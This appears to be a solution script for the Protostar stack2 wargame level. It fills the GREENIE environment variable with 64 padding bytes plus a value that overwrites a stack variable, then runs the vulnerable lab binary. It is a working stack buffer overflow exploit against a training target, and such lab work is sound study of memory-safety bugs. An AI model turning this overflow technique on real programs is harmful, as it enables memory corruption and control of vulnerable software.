#!/usr/bin/python
# Goal is 0x0d0a0d0a

import commands
import os

greenie = 'A'*64 + '\x0a\x0d\x0a\x0d'

os.environ["GREENIE"] = greenie

#print '"' + os.environ["GREENIE"] + '"'

command = '/opt/protostar/bin/stack2'

output = commands.getoutput(command)
print(output)
